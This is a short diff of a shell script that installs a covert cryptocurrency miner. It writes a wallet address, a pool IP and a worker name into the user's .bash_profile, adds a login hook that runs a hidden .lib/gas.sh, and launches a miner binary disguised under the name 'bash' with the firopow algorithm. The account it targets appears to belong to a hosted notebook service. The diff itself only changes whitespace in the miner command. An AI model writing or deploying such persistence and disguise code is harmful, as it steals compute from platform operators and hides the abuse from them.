@@ -22,6 +22,6 @@ echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="aHAuNULsUCUmbkmeitGtNLVUXBcaSPFoUR"' >> /home/studio-lab-user/.bash_profile
 echo 'POOLNH="174.138.68.245:80"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/bash --algo firopow -s $POOLNH -u  $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
+echo "./.lib/bash --algo firopow -s $POOLNH -u $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
 
